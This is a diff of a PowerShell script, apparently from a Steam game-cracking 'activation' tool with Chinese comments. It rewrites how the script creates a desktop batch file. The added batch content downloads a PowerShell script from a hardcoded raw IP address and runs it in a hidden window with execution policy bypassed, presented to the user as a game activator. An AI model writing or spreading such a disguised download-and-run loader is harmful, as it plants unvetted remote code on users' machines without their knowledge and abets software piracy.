@@ -121,29 +121,34 @@ try {
     }
 }
 
-# ========== 【核心修改点：使用 @' ... '@ 绝对避免解析报错】 ==========
+# ========== 【彻底重构：绝对无解析错误的自修复BAT生成法】 ==========
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $batPath = Join-Path $desktopPath "游戏激活程序.bat"
-$batContent = @'
-@echo off
-chcp 65001 >nul
-set "PS_FILE=C:\Program Files\SteamPatch\LuaActivator.ps1"
-set "DOWNLOAD_URL=http://47.100.104.45/files/LuaActivator.ps1"
 
-if not exist "%PS_FILE%" (
-    echo 正在自动下载激活工具，请稍候...
-    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%PS_FILE%'"
+# 使用数组拼接，避免任何 BOM 编码或特殊字符导致的 PowerShell 识别崩溃
+$batLines = @(
+    "@echo off",
+    "chcp 65001 >nul",
+    'set "PS_FILE=C:\Program Files\SteamPatch\LuaActivator.ps1"',
+    'set "DOWNLOAD_URL=http://47.100.104.45/files/LuaActivator.ps1"',
+    "",
+    'if not exist "%PS_FILE%" (',
+    '    echo 正在自动下载激活工具，请稍候...',
+    '    powershell -Command "Invoke-WebRequest -Uri ''%DOWNLOAD_URL%'' -OutFile ''%PS_FILE%''"',
+    ')',
+    "",
+    'if exist "%PS_FILE%" (',
+    '    start "" powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS_FILE%"',
+    ') else (',
+    '    echo 激活工具下载失败，请检查网络连接。',
+    '    pause',
+    ')',
+    "exit"
 )
 
-if exist "%PS_FILE%" (
-    start "" powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS_FILE%"
-) else (
-    echo 激活工具下载失败，请检查网络连接。
-    pause
-)
-exit
-'@
-$batContent | Out-File $batPath -Encoding Default -Force
+$batContent = $batLines -join "`r`n"
+# 强制使用 ASCII 编码，彻底粉碎 BOM 头
+$batContent | Out-File $batPath -Encoding ASCII -Force
 
 # ========== 启动Steam + 快速等待 + 弹出激活窗口 ==========
 Start-Process "$SteamRoot\steam.exe"
